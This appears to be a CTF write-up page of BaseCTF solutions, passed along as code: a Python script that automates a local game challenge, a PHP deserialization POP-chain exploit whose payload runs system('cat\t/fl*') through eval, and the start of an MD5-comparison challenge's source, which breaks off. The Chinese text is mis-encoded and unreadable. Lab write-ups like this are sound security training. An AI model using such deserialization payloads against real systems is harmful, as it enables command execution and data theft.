<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://127.0.0.1:64459/&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">directions_map = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;å—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">combinations_map = &#123;</span><br><span class="line">    <span class="string">&#x27;1, 2&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;2, 1&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 3&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;3, 1&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 4&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;4, 1&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 5&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;5, 1&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 6&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 1&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 7&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 1&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1, 8&#x27;</span>: <span class="string">&#x27;åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 1&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼ŒåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 3&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;3, 2&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 4&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;4, 2&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 5&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;5, 2&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 6&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 2&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 7&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 2&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2, 8&#x27;</span>: <span class="string">&#x27;ä¸œåŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 2&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œåŒ—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 4&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;4, 3&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 5&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;5, 3&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 6&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 3&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 7&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 3&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3, 8&#x27;</span>: <span class="string">&#x27;ä¸œæ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 3&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œæ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4, 5&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;5, 4&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4, 6&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 4&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4, 7&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 4&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4, 8&#x27;</span>: <span class="string">&#x27;ä¸œå—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 4&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œä¸œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5, 6&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;6, 5&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5, 7&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 5&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5, 8&#x27;</span>: <span class="string">&#x27;å—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 5&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œå—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6, 7&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;7, 6&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6, 8&#x27;</span>: <span class="string">&#x27;è¥¿å—æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 6&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿å—æ–¹ä¸€ä¸ª&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7, 8&#x27;</span>: <span class="string">&#x27;è¥¿æ–¹ä¸€ä¸ªï¼Œè¥¿åŒ—æ–¹ä¸€ä¸ª&#x27;</span>, <span class="string">&#x27;8, 7&#x27;</span>: <span class="string">&#x27;è¥¿åŒ—æ–¹ä¸€ä¸ªï¼Œè¥¿æ–¹ä¸€ä¸ª&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_direction</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;,&#x27;</span> <span class="keyword">in</span> numbers:</span><br><span class="line">        <span class="keyword">return</span> combinations_map.get(numbers, <span class="string">&#x27;æœªçŸ¥ç»„åˆ&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> directions_map.get(numbers, <span class="string">&#x27;æœªçŸ¥æ–¹ä½&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å§‹æ¸¸æˆ</span></span><br><span class="line">start_data = &#123;</span><br><span class="line">    <span class="string">&#x27;player&#x27;</span>: <span class="string">&#x27;zxy&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;direct&#x27;</span>: <span class="string">&#x27;å¼Ÿå­æ˜ç™½&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = session.post(base_url, headers=headers, data=start_data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    numbers = soup.find(<span class="string">&#x27;h1&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;status&#x27;</span>).text.strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æ¥æ”¶åˆ°çš„æ•°å­—ç»„åˆ: <span class="subst">&#123;numbers&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¡ç®—æ–¹ä½</span></span><br><span class="line">    direction = get_direction(numbers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;è®¡ç®—å‡ºçš„æ–¹ä½: <span class="subst">&#123;direction&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æäº¤æ–¹ä½</span></span><br><span class="line">    answer_data = &#123;</span><br><span class="line">        <span class="string">&#x27;player&#x27;</span>: <span class="string">&#x27;zxy&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;direct&#x27;</span>: direction</span><br><span class="line">    &#125;</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    response = session.post(base_url, headers=headers, data=answer_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æäº¤äº†æ–¹ä½<span class="subst">&#123;answer_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="BASECTF-Week2-Really-EZ-POP"><a href="#BASECTF-Week2-Really-EZ-POP" class="headerlink" title="BASECTF [Week2] Really EZ POP"></a>BASECTF [Week2] Really EZ POP</h2><p>å…³äºpopé“¾çš„ç§æœ‰å±æ€§åå°„æœºåˆ¶ä»¥åŠä¸€äº›è¿‡æ»¤ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;system(&#x27;cat\t/fl*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd); <span class="comment">//0 shell</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word; <span class="comment">//1 Sink</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>(); <span class="comment">//2 Shark</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see; <span class="comment">//3 Sea</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nature</span> = <span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="variable">$sea</span> = <span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line"><span class="variable">$shark</span> = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$sink</span> = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$sharkReflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;Shark&#x27;</span>);</span><br><span class="line"><span class="variable">$wordProperty</span> = <span class="variable">$sharkReflection</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;word&#x27;</span>);</span><br><span class="line"><span class="variable">$wordProperty</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$wordProperty</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$shark</span>, <span class="variable">$sink</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sea</span>-&gt;animal = <span class="variable">$shark</span>;</span><br><span class="line"><span class="variable">$nature</span>-&gt;sea = <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nature</span>));</span><br></pre></td></tr></table></figure>

<h2 id="BaseCTF-æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5"><a href="#BaseCTF-æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5" class="headerlink" title="BaseCTF æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?"></a>BaseCTF æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5 äº†?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span> !== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»€ä¹ˆ? ä½ ç»•è¿‡å»äº†?</span></span><br><span class="line"><span class="comment">// åŠ å¤§å‰‚é‡!</span></span><br><span class="line"><span class="comment">// æˆ‘è¦è®©ä»–æˆä¸º string</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;éš¾å—?ä¸éš¾!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ è¿˜æ˜¯ç»•è¿‡å»äº†?</span></span><br><span class="line"><span class="comment">// å“¦å“¦å“¦, æˆ‘å°‘äº†ä¸€ä¸ªç­‰äºå·</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº†</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ æƒ³çœ‹åˆ° random çš„å€¼å—?</span></span><br><span class="line"><span class="comment">// ä½ ä¸æ˜¯å¾ˆæ‡‚ MD5 å—? é‚£æˆ‘å°±å‘Šè¯‰ä½ ä»–çš„ MD5 å§</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span 